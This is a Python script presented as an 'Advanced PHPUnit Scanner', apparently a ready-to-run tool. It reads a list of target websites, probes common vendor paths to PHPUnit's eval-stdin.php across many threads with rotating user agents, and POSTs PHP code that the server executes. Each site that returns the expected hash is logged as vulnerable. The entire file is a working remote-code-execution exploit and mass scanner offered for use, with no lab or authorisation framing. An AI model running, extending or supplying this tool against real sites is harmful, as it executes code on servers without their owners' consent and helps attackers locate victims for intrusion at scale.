#!/usr/bin/python3

import os
import requests
import concurrent.futures
from datetime import datetime
from colorama import Fore, Style, init, Back
import random
import time
import hashlib
import sys
import urllib3
from urllib.parse import urlparse
from tqdm import tqdm
import pyfiglet
from termcolor import colored
import base64

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ElegantPHPUnitChecker:
    def __init__(self):
        self.timeout = 15
        self.max_retries = 3
        self.headers = self.generate_headers()
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.results_dir = "results"
        self.vuln_file = f"{self.results_dir}/vulnerable_{self.timestamp}.txt"
        self.error_file = f"{self.results_dir}/errors_{self.timestamp}.txt"
        self.total_checked = 0
        self.total_vulnerable = 0
        self.total_errors = 0
        self.start_time = None
        self.setup_directories()

    def print_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        banner_text = pyfiglet.figlet_format("PHPUnit RCE", font="slant")
        colored_banner = colored(banner_text, 'cyan', attrs=['bold'])
        print(colored_banner)
        
        version_info = """
        ╔══════════════════════════════════════════════════════════════╗
        ║                 Advanced PHPUnit Scanner v2.1                ║
        ║           Enhanced Security Testing & Validation             ║
        ╚══════════════════════════════════════════════════════════════╝
        """
        print(colored(version_info, 'white', attrs=['bold']))
        
        author_info = """
        [*] Created by: Joel Indra
        [*] GitHub: github.com/joelindra
        [*] Version: 2.1 
        """
        print(colored(author_info, 'yellow', attrs=['bold']))
        print("="*70 + "\n")

    def setup_directories(self):
        if not os.path.exists(self.results_dir):
            os.makedirs(self.results_dir)

    def print_status(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        duration = time.time() - self.start_time
        
        status = f"""
        {'='*70}
        {colored('Scan Status:', 'cyan', attrs=['bold'])}
        
        🔍 Total Checked: {self.total_checked}
        ✅ Vulnerable Found: {self.total_vulnerable}
        ❌ Errors: {self.total_errors}
        ⏱️ Duration: {duration:.2f} seconds
        {'='*70}
        """
        print(status)

    def generate_headers(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/92.0.4515.107",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Firefox/90.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) Safari/605.1.15"
        ]
        return {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }

    def verify_phpunit(self, url, path):
        full_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
        
        try:
            # Initial check to see if the path exists
            response = requests.get(
                full_url,
                headers=self.headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            
            if response.status_code == 200:
                # Update headers for the vulnerability test
                test_headers = self.headers.copy()
                test_headers['Content-Type'] = 'text/html'
                
                # Use the md5 hash verification method
                check_response = requests.post(
                    full_url,
                    headers=test_headers,
                    data="<?php echo md5('phpunit_rce'); ?>",
                    timeout=self.timeout,
                    verify=False
                )
                
                # Check for the specific MD5 hash in the response
                if "6dd70f16549456495373a337e6708865" in check_response.text:
                    return True, full_url, check_response.text
                        
            return False, None, None
            
        except requests.RequestException:
            return False, None, None

    def save_result(self, url, details=""):
        with open(self.vuln_file, "a") as f:
            f.write(f"""
{'='*50}
URL: {url}
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Details: {details}
{'='*50}
""")
        self.total_vulnerable += 1
        
        # Print fancy notification
        notification = f"""
{Fore.GREEN}╔{'═'*50}╗
║ {' '*15}VULNERABILITY FOUND!{' '*14}║
╠{'═'*50}╣
║ URL: {url.ljust(43)}║
╚{'═'*50}╝{Style.RESET_ALL}
"""
        print(notification)

    def save_error(self, url, error):
        with open(self.error_file, "a") as f:
            f.write(f"URL: {url}\nError: {str(error)}\n{'-'*50}\n")
        self.total_errors += 1

    def check_site(self, site):
        site = site.strip()
        if not site.startswith(('http://', 'https://')):
            site = f'http://{site}'
            
        try:
            domain = urlparse(site).netloc
            
            paths = [
                "vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "sites/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            ]

            for path in paths:
                for retry in range(self.max_retries):
                    try:
                        is_vulnerable, full_url, response_text = self.verify_phpunit(site, path)
                        if is_vulnerable:
                            self.save_result(full_url, f"Path: {path}\nResponse: {response_text[:100]}...")
                            return
                        break
                    except requests.RequestException as e:
                        if retry == self.max_retries - 1:
                            self.save_error(site, e)
                        time.sleep(1)
                        continue

        except Exception as e:
            self.save_error(site, e)
        
        finally:
            self.total_checked += 1
            if self.total_checked % 10 == 0:  # Update status every 10 sites
                self.print_status()

    def run(self):
        self.print_banner()
        
        target_list = input(colored("📁 Enter target list file: ", 'yellow', attrs=['bold']))
        thread_count = int(input(colored("🔄 Enter number of threads (default 10): ", 'yellow', attrs=['bold'])) or 10)
        
        if not os.path.exists(target_list):
            print(colored("\n❌ Target list file not found!", 'red', attrs=['bold']))
            return
            
        with open(target_list) as f:
            targets = [line.strip() for line in f if line.strip()]
            
        total_targets = len(targets)
        
        print(colored(f"\n📊 Loaded {total_targets} targets", 'cyan', attrs=['bold']))
        print(colored(f"🚀 Starting scan with {thread_count} threads\n", 'cyan', attrs=['bold']))
        
        self.start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
            list(tqdm(executor.map(self.check_site, targets), 
                     total=len(targets), 
                     desc="Scanning Progress",
                     bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]"))
            
        duration = time.time() - self.start_time
        
        # Print final summary
        summary = f"""
{'='*70}
{colored('Scan Summary:', 'cyan', attrs=['bold'])}

📊 Total Sites Scanned: {self.total_checked}
✅ Vulnerable Sites Found: {self.total_vulnerable}
❌ Errors Encountered: {self.total_errors}
⏱️ Total Duration: {duration:.2f} seconds

📁 Results saved to: {self.vuln_file}
📝 Error log: {self.error_file}
{'='*70}
"""
        print(summary)

if __name__ == "__main__":
    try:
        scanner = ElegantPHPUnitChecker()
        scanner.run()
    except KeyboardInterrupt:
        print(colored("\n\n🛑 Scan interrupted by user", 'yellow', attrs=['bold']))
        sys.exit(0)
